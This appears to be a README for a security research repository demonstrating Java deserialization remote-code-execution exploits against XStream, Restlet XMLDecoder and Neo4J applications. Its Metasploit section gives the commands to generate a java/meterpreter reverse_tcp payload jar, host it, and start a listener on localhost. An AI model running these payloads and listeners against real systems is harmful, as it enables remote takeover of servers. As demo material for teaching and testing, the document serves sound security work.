## Demos

* SpringXStream: Idea project with a SpringMVC RESTful application using XStream and RCE exploits
* RestletXMLDecoder: Java Project with a Restlet application using object representation and RCCE exploits
* Neo4J: Both server and RCE exploits

## Using Metasploit
The demos have been weaponized to use meterpreter sessions. Meterpreter have been modified to run the payload at object instantiation time. Once your MSF installation has been modified to use the modified meterpreter session (download it from https://github.com/pwntester/metasploit-javapayload), run the following command to generate the malicious jar.
./msfpayload java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > met.jar

### Place the malicious jar somewhere to be be found:
cp met.jar /Users/alvaro/Sites (http://localhost/~alvaro/met.jar)

### Start the msf listener
use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST  127.0.0.1
set LPORT 4444
exploit

